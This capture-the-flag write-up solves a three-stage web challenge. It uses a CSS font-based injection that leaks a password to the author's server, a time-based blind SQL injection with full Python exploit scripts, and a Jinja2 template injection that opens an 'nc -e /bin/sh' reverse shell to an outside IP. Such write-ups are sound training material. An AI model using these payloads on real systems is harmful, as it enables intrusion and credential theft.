Day 24: Chatterbox
==================
> *... likes to talk*
> 
> I love to chat secure and private.
> 
> For this I mostly use http://challenges.hackvent.hacking-lab.com:1087.
> 
> It's easy to create a private chat and start chatting without a registration.
> Hint #1: the admin is a lazy clicker boy and only likes \<a href="...">\</a>
> Hint #2: As a passionate designer, the admin loves different fonts.
> Hint #3: For step 2: I'd better be my own CA.
> Hint #4: For step 2: It's all about the state
> Hint #5: For step 3: python programmers don't need {{ ninjas }}

This challenge was divided in 3 stages that are described separately here.

## Stage 1
In this part, a web application is presented with a public chat, the possibility to create private chats with custom CSS, a feedback form and a login form. It was bot possible to achieve XSS, every input was encodede properly when displayed. However, the custom CSS was stored and reused as far as the session was kept. This allowed for CSS injection, then you would only need someone to visit your private chat to get the malicious CSS. This was possible thanks to the feedback form.

A first step to confirm that was to create a private chat with this custom CSS:
```css
body {
	background-color: powderblue;
	background-image: url("http://wiki.photochrome.ch/test02.png");
}
```

Then one can send the feedback form to with the following message:
```html
<a href="http://challenges.hackvent.hacking-lab.com:1087/private_chat.php?secret=PrivateChatUniqueIdentifier">link</a>
```

A tool in the background would then visit the link and a connection was made to my web server, proving that it works. Then, it is assumed that the bot will enter the password in the login form and, based on <http://mksben.l0.cm/2015/10/css-based-attack-abusing-unicode-range.html>, we inject the following CSS:
```css
@font-face{ font-family:poc; src: url(https://wiki.photochrome.ch/HACKVENT24/?A); unicode-range:U+0041; }
@font-face{ font-family:poc; src: url(https://wiki.photochrome.ch/HACKVENT24/?B); unicode-range:U+0042; }
@font-face{ font-family:poc; src: url(https://wiki.photochrome.ch/HACKVENT24/?C); unicode-range:U+0043; }
@font-face{ font-family:poc; src: url(https://wiki.photochrome.ch/HACKVENT24/?D); unicode-range:U+0044; }
@font-face{ font-family:poc; src: url(https://wiki.photochrome.ch/HACKVENT24/?E); unicode-range:U+0045; }
@font-face{ font-family:poc; src: url(https://wiki.photochrome.ch/HACKVENT24/?F); unicode-range:U+0046; }
@font-face{ font-family:poc; src: url(https://wiki.photochrome.ch/HACKVENT24/?G); unicode-range:U+0047; }
@font-face{ font-family:poc; src: url(https://wiki.photochrome.ch/HACKVENT24/?H); unicode-range:U+0048; }
@font-face{ font-family:poc; src: url(https://wiki.photochrome.ch/HACKVENT24/?I); unicode-range:U+0049; }
@font-face{ font-family:poc; src: url(https://wiki.photochrome.ch/HACKVENT24/?J); unicode-range:U+004A; }
@font-face{ font-family:poc; src: url(https://wiki.photochrome.ch/HACKVENT24/?K); unicode-range:U+004B; }
@font-face{ font-family:poc; src: url(https://wiki.photochrome.ch/HACKVENT24/?L); unicode-range:U+004C; }
@font-face{ font-family:poc; src: url(https://wiki.photochrome.ch/HACKVENT24/?M); unicode-range:U+004D; }
@font-face{ font-family:poc; src: url(https://wiki.photochrome.ch/HACKVENT24/?N); unicode-range:U+004E; }
@font-face{ font-family:poc; src: url(https://wiki.photochrome.ch/HACKVENT24/?O); unicode-range:U+004F; }
@font-face{ font-family:poc; src: url(https://wiki.photochrome.ch/HACKVENT24/?P); unicode-range:U+0050; }
@font-face{ font-family:poc; src: url(https://wiki.photochrome.ch/HACKVENT24/?Q); unicode-range:U+0051; }
@font-face{ font-family:poc; src: url(https://wiki.photochrome.ch/HACKVENT24/?R); unicode-range:U+0052; }
@font-face{ font-family:poc; src: url(https://wiki.photochrome.ch/HACKVENT24/?S); unicode-range:U+0053; }
@font-face{ font-family:poc; src: url(https://wiki.photochrome.ch/HACKVENT24/?T); unicode-range:U+0054; }
@font-face{ font-family:poc; src: url(https://wiki.photochrome.ch/HACKVENT24/?U); unicode-range:U+0055; }
@font-face{ font-family:poc; src: url(https://wiki.photochrome.ch/HACKVENT24/?V); unicode-range:U+0056; }
@font-face{ font-family:poc; src: url(https://wiki.photochrome.ch/HACKVENT24/?W); unicode-range:U+0057; }
@font-face{ font-family:poc; src: url(https://wiki.photochrome.ch/HACKVENT24/?X); unicode-range:U+0058; }
@font-face{ font-family:poc; src: url(https://wiki.photochrome.ch/HACKVENT24/?Y); unicode-range:U+0059; }
@font-face{ font-family:poc; src: url(https://wiki.photochrome.ch/HACKVENT24/?Z); unicode-range:U+005A; }
@font-face{ font-family:poc; src: url(https://wiki.photochrome.ch/HACKVENT24/?a); unicode-range:U+0061; }
@font-face{ font-family:poc; src: url(https://wiki.photochrome.ch/HACKVENT24/?b); unicode-range:U+0062; }
@font-face{ font-family:poc; src: url(https://wiki.photochrome.ch/HACKVENT24/?c); unicode-range:U+0063; }
@font-face{ font-family:poc; src: url(https://wiki.photochrome.ch/HACKVENT24/?d); unicode-range:U+0064; }
@font-face{ font-family:poc; src: url(https://wiki.photochrome.ch/HACKVENT24/?e); unicode-range:U+0065; }
@font-face{ font-family:poc; src: url(https://wiki.photochrome.ch/HACKVENT24/?f); unicode-range:U+0066; }
@font-face{ font-family:poc; src: url(https://wiki.photochrome.ch/HACKVENT24/?g); unicode-range:U+0067; }
@font-face{ font-family:poc; src: url(https://wiki.photochrome.ch/HACKVENT24/?h); unicode-range:U+0068; }
@font-face{ font-family:poc; src: url(https://wiki.photochrome.ch/HACKVENT24/?i); unicode-range:U+0069; }
@font-face{ font-family:poc; src: url(https://wiki.photochrome.ch/HACKVENT24/?j); unicode-range:U+006A; }
@font-face{ font-family:poc; src: url(https://wiki.photochrome.ch/HACKVENT24/?k); unicode-range:U+006B; }
@font-face{ font-family:poc; src: url(https://wiki.photochrome.ch/HACKVENT24/?l); unicode-range:U+006C; }
@font-face{ font-family:poc; src: url(https://wiki.photochrome.ch/HACKVENT24/?m); unicode-range:U+006D; }
@font-face{ font-family:poc; src: url(https://wiki.photochrome.ch/HACKVENT24/?n); unicode-range:U+006E; }
@font-face{ font-family:poc; src: url(https://wiki.photochrome.ch/HACKVENT24/?o); unicode-range:U+006F; }
@font-face{ font-family:poc; src: url(https://wiki.photochrome.ch/HACKVENT24/?p); unicode-range:U+0070; }
@font-face{ font-family:poc; src: url(https://wiki.photochrome.ch/HACKVENT24/?q); unicode-range:U+0071; }
@font-face{ font-family:poc; src: url(https://wiki.photochrome.ch/HACKVENT24/?r); unicode-range:U+0072; }
@font-face{ font-family:poc; src: url(https://wiki.photochrome.ch/HACKVENT24/?s); unicode-range:U+0073; }
@font-face{ font-family:poc; src: url(https://wiki.photochrome.ch/HACKVENT24/?t); unicode-range:U+0074; }
@font-face{ font-family:poc; src: url(https://wiki.photochrome.ch/HACKVENT24/?u); unicode-range:U+0075; }
@font-face{ font-family:poc; src: url(https://wiki.photochrome.ch/HACKVENT24/?v); unicode-range:U+0076; }
@font-face{ font-family:poc; src: url(https://wiki.photochrome.ch/HACKVENT24/?w); unicode-range:U+0077; }
@font-face{ font-family:poc; src: url(https://wiki.photochrome.ch/HACKVENT24/?x); unicode-range:U+0078; }
@font-face{ font-family:poc; src: url(https://wiki.photochrome.ch/HACKVENT24/?y); unicode-range:U+0079; }
@font-face{ font-family:poc; src: url(https://wiki.photochrome.ch/HACKVENT24/?z); unicode-range:U+007A; }
@font-face{ font-family:poc; src: url(https://wiki.photochrome.ch/HACKVENT24/?0); unicode-range:U+0030; }
@font-face{ font-family:poc; src: url(https://wiki.photochrome.ch/HACKVENT24/?1); unicode-range:U+0031; }
@font-face{ font-family:poc; src: url(https://wiki.photochrome.ch/HACKVENT24/?2); unicode-range:U+0032; }
@font-face{ font-family:poc; src: url(https://wiki.photochrome.ch/HACKVENT24/?3); unicode-range:U+0033; }
@font-face{ font-family:poc; src: url(https://wiki.photochrome.ch/HACKVENT24/?4); unicode-range:U+0034; }
@font-face{ font-family:poc; src: url(https://wiki.photochrome.ch/HACKVENT24/?5); unicode-range:U+0035; }
@font-face{ font-family:poc; src: url(https://wiki.photochrome.ch/HACKVENT24/?6); unicode-range:U+0036; }
@font-face{ font-family:poc; src: url(https://wiki.photochrome.ch/HACKVENT24/?7); unicode-range:U+0037; }
@font-face{ font-family:poc; src: url(https://wiki.photochrome.ch/HACKVENT24/?8); unicode-range:U+0038; }
@font-face{ font-family:poc; src: url(https://wiki.photochrome.ch/HACKVENT24/?9); unicode-range:U+0039; }

#password{ font-family:poc; }
```

After sending the link to the private chat through the feedback form, the following connections were present in my server's log:
```
80.74.140.188 - - [24/Dec/2017:12:37:58 +0100] "GET /HACKVENT24/?C HTTP/1.1" 404 193 "http://hv24/uploads/style_9175d7196dbe036119871e101ea36561.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/63.0.3239.84 Safari/537.36"
80.74.140.188 - - [24/Dec/2017:12:37:58 +0100] "GET /HACKVENT24/?h HTTP/1.1" 404 193 "http://hv24/uploads/style_9175d7196dbe036119871e101ea36561.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/63.0.3239.84 Safari/537.36"
80.74.140.188 - - [24/Dec/2017:12:37:58 +0100] "GET /HACKVENT24/?r HTTP/1.1" 404 193 "http://hv24/uploads/style_9175d7196dbe036119871e101ea36561.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/63.0.3239.84 Safari/537.36"
80.74.140.188 - - [24/Dec/2017:12:37:58 +0100] "GET /HACKVENT24/?i HTTP/1.1" 404 193 "http://hv24/uploads/style_9175d7196dbe036119871e101ea36561.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/63.0.3239.84 Safari/537.36"
80.74.140.188 - - [24/Dec/2017:12:37:58 +0100] "GET /HACKVENT24/?s HTTP/1.1" 404 193 "http://hv24/uploads/style_9175d7196dbe036119871e101ea36561.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/63.0.3239.84 Safari/537.36"
80.74.140.188 - - [24/Dec/2017:12:37:58 +0100] "GET /HACKVENT24/?t HTTP/1.1" 404 193 "http://hv24/uploads/style_9175d7196dbe036119871e101ea36561.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/63.0.3239.84 Safari/537.36"
80.74.140.188 - - [24/Dec/2017:12:37:58 +0100] "GET /HACKVENT24/?m HTTP/1.1" 404 193 "http://hv24/uploads/style_9175d7196dbe036119871e101ea36561.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/63.0.3239.84 Safari/537.36"
80.74.140.188 - - [24/Dec/2017:12:37:58 +0100] "GET /HACKVENT24/?a HTTP/1.1" 404 193 "http://hv24/uploads/style_9175d7196dbe036119871e101ea36561.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/63.0.3239.84 Safari/537.36"
80.74.140.188 - - [24/Dec/2017:12:37:58 +0100] "GET /HACKVENT24/?2 HTTP/1.1" 404 193 "http://hv24/uploads/style_9175d7196dbe036119871e101ea36561.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/63.0.3239.84 Safari/537.36"
80.74.140.188 - - [24/Dec/2017:12:37:58 +0100] "GET /HACKVENT24/?0 HTTP/1.1" 404 193 "http://hv24/uploads/style_9175d7196dbe036119871e101ea36561.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/63.0.3239.84 Safari/537.36"
80.74.140.188 - - [24/Dec/2017:12:37:58 +0100] "GET /HACKVENT24/?1 HTTP/1.1" 404 193 "http://hv24/uploads/style_9175d7196dbe036119871e101ea36561.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/63.0.3239.84 Safari/537.36"
80.74.140.188 - - [24/Dec/2017:12:37:58 +0100] "GET /HACKVENT24/?7 HTTP/1.1" 404 193 "http://hv24/uploads/style_9175d7196dbe036119871e101ea36561.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/63.0.3239.84 Safari/537.36"
```

The password can be guessed from here (only the second `s` is missing), it was Christmas2017. Then one only has to login to the form using this password to get the URL to the second stage:
```
challenges.hackvent.hacking-lab.com:1088?key=E7g24fPcZgL5dg78
```

## Stage 2
In this tage we had access to the admin panel of the application. Several tools were available, I found the CORS tool most interesting but it was not to be exploited. Still, I found that the servers uses MySql using this tool and sending the following query:
```
GET /php/api.php?function=cors&argument=http://localhost:3306&key=E7g24fPcZgL5dg78 HTTP/1.1
Host: challenges.hackvent.hacking-lab.com:1088
X-Requested-With: XMLHttpRequest
Connection: close
```

The response shows the version of the server:
```
HTTP/1.1 200 OK
Date: Wed, 27 Dec 2017 07:07:51 GMT
Server: Apache/2.4.25 (Debian)
Content-Length: 37
Connection: close
Content-Type: text/html; charset=UTF-8b5.5.5-10.1.26-MariaDB-0+deb9u1ý
```

Since the headers were displayed on the website unencoded it was also possible to do reflected XSS by including a special header in the configuration of some webserver but this was not useful for the challenge. The Certificate signing tool had to be exploited. It was possible to send a CSR and a signed certificate would be sent in return.

When creating a CSR and sending it, one field reacted differently with sepecial characters. When including a single quote in this field during the CSR creation, an error 500 would be returned. This hint already at SQL injection and could be proved by sending the following payload (in the State field of the CSR):
```
'OR((SELECT SLEEP(5)))OR'
```

The response would come correctly with a certificate signed by the CA but with a 5 seconds delay. Thus proving the time-based blind SQL injection. At this step I made a small tool to generate the CSR with a given payload and send the query automatically in python, `query_csr.py`:
```python
#!/usr/bin/env python3

from OpenSSL import crypto, SSL
import sys
import requests

TYPE_RSA = crypto.TYPE_RSA
TYPE_DSA = crypto.TYPE_DSA

# adapted from https://github.com/pyca/pyopenssl/blob/master/examples/certgen.py
def create_CSR(pkey, payload, digest="sha256"):
    req = crypto.X509Req()
    subj = req.get_subject()

    setattr(subj, 'ST', payload)

    req.set_pubkey(pkey)
    req.sign(pkey, digest)
    return req

# statically defined key
key_str = """-----BEGIN RSA PRIVATE KEY-----
[CUT BY trolli101]
-----END RSA PRIVATE KEY-----
"""
key = crypto.load_privatekey(crypto.FILETYPE_PEM, key_str)

# generate CSR with argument 1 as payload
csr = create_CSR(key, sys.argv[1])
csr_str = crypto.dump_certificate_request(crypto.FILETYPE_PEM, csr).decode()

# send request and display status code and response
r = requests.post('http://challenges.hackvent.hacking-lab.com:1088/php/api.php?function=csr&argument=&key=E7g24fPcZgL5dg78', data = {'csr':csr_str})
print('=== {} ==='.format(r.status_code))
print(r.text)
```

Then I tried to develop a custom tamper script for sqlmap, this was successful to detect the injection but the exploitation failed because of the length limitation of the State field (128 characters). I did not find a way to limit the payload size in sqlmap so I developed a custom script to exploit the blind injection based on the previous script:
```python
#!/usr/bin/env python3

import requests
import time
import math
import sys
from OpenSSL import crypto, SSL

TYPE_RSA = crypto.TYPE_RSA
TYPE_DSA = crypto.TYPE_DSA

TIMEOUT = 1

# adapted from https://github.com/pyca/pyopenssl/blob/master/examples/certgen.py
def create_CSR(pkey, payload, digest="sha256"):
    req = crypto.X509Req()
    subj = req.get_subject()

    setattr(subj, 'ST', payload)

    req.set_pubkey(pkey)
    req.sign(pkey, digest)
    return req

# statically defined key
key_str = """-----BEGIN RSA PRIVATE KEY-----
[CUT BY trolli101]
-----END RSA PRIVATE KEY-----
"""
KEY = crypto.load_privatekey(crypto.FILETYPE_PEM, key_str)

# start of the payload
payl = "'OR(IF("
# the string we want to know about, expressed in SQL syntax
target = sys.argv[1]
# end of the payload
suff = ",0,SLEEP("+str(TIMEOUT)+")))OR'"

# get target length
found = False
i = 0
length = 0
while not found:
    test = 'LENGTH((' + target + '))>' + str(i)
    full_payload = payl+test+suff
    csr = create_CSR(KEY, full_payload)
    csr_str = crypto.dump_certificate_request(crypto.FILETYPE_PEM, csr).decode()
    start = time.time()
    requests.post('http://challenges.hackvent.hacking-lab.com:1088/php/api.php?function=csr&argument=&key=E7g24fPcZgL5dg78', data = {'csr':csr_str})
    end = time.time()

    if end-start >= TIMEOUT:
        found = True
        length = i
        print('Length = ' + str(i))
    i += 1

# get the value using bissection to gain some time
value = ''
print('Value = ')
for pos in range(length):
    found = False
    l = 0
    r = 127
    while not found:
        if l > r:
            print('Issue, value not found, maybe increase timeout?')
            exit()
        m = math.floor((l + r) / 2)
        test = 'ASCII(MID((' + target + '),' + str(pos+1) + ',1))>' + str(m)
        full_payload = payl+test+suff
        csr = create_CSR(KEY, full_payload)
        csr_str = crypto.dump_certificate_request(crypto.FILETYPE_PEM, csr).decode()
        start = time.time()
        requests.post('http://challenges.hackvent.hacking-lab.com:1088/php/api.php?function=csr&argument=&key=E7g24fPcZgL5dg78', data = {'csr':csr_str})
        end = time.time()

        if end-start < TIMEOUT:
            l = m + 1
        else:
            test = 'ASCII(MID((' + target + '),' + str(pos+1) + ',1))<' + str(m)
            full_payload = payl+test+suff
            csr = create_CSR(KEY, full_payload)
            csr_str = crypto.dump_certificate_request(crypto.FILETYPE_PEM, csr).decode()
            start = time.time()
            requests.post('http://challenges.hackvent.hacking-lab.com:1088/php/api.php?function=csr&argument=&key=E7g24fPcZgL5dg78', data = {'csr':csr_str})
            end = time.time()

            if end-start < TIMEOUT:
                r = m - 1
            else:
                found = True
                value += chr(m)
                print(value)
```

Using this script I was able to check first some values to confirm that it worked:
```
$ ./sqlexploit.py 'select @@version'
10.1.26-MariaDB-0+deb9u1
$ ./sql-exploit.py 'select user()'
admin@localhost
```

Then using the following query in the script and iterating on the limit I could list all databases:
```
select schema_name from information_schema.schemata limit 0,1

hv24_2
information_schema
mysql
performance_schema
```

Then I could list the tables (again iterating on the limit):
```
select table_name,table_schema from information_schema.tables limit 0,1

certificates
keystorage
ALL_PLUGINS
APPLICABLE_ROLES
... and more
```

Then the columns in the same way:
```
select column_name from information_schema.columns limit 0,1

issue_date
organization
state
public_key
country
private_key
... and more
```

Eventually I could dump the value of the private key that was actually a link to stage 3:
```
select private_key from hv24_2.keystorage limit 0,1

challenges.hackvent.hacking-lab.com:1089?key=W5zzcusgZty9CNgw
```

## Stage 3
Here we had an web shop under construction. I first thought of a JWT token because of the session cookies that were like `eyJsb2dnZWRpbiI6InllcyJ9.DSOzwA.QL1ZWPooVzAZArJbijumKM88Jgc`. And the payload value was increasing each second. I tried to crack the but had no luck.

Then, with the 5th hint, it appears that it was a server-side template injection in Jinja2. Two references helped me to exploit this:

1. <http://blog.portswigger.net/2015/08/server-side-template-injection.html>
2. <https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii/>

I could first confirm the injection with the following request/response:
```
GET /{{7*'7'}}/12?key=W5zzcusgZty9CNgw HTTP/1.1
Host: challenges.hackvent.hacking-lab.com:1089
Connection: close
```

The 404 error includes the payload interpreted:
```
HTTP/1.0 404 NOT FOUND
Content-Type: text/html; charset=utf-8
Content-Length: 231
Server: Werkzeug/0.13 Python/3.5.3
Date: Wed, 27 Dec 2017 07:37:01 GMT


    <div class="center-content error">
        <h1>Oops! That page doesn't exist.</h1>
        <h3>http://challenges.hackvent.hacking-lab.com:1089/7777777/12?key=W5zzcusgZty9CNgw</h3>
		<img src="/static/img/404.jpg">
    </div>
```

Then after wasting a lot of time on small mistakes I could get a reverse shell with the following request:
```
GET /{{%207.__class__.__mro__[1].__subclasses__()[37](['nc','-e','/bin/sh','92.222.68.177','53'])%20}}/12?key=W5zzcusgZty9CNgw HTTP/1.1
Host: challenges.hackvent.hacking-lab.com:1089
Connection: close
```

This opens a new subprocess with the python class `subprocess.Popen` and runs ncat to send a reverse shell to my server on port 53. On the server, the following happens:
```
# nc -lvp 53
listening on [any] 53 ...
connect to [92.222.68.177] from urb80-74-140-188.ch-meta.net [80.74.140.188] 38386
```

Then one can search for the flag and find it in `/home/flag`:
```
cat /home/flag
HV17-7h1s-1sju-t4ra-nd0m-flag
```
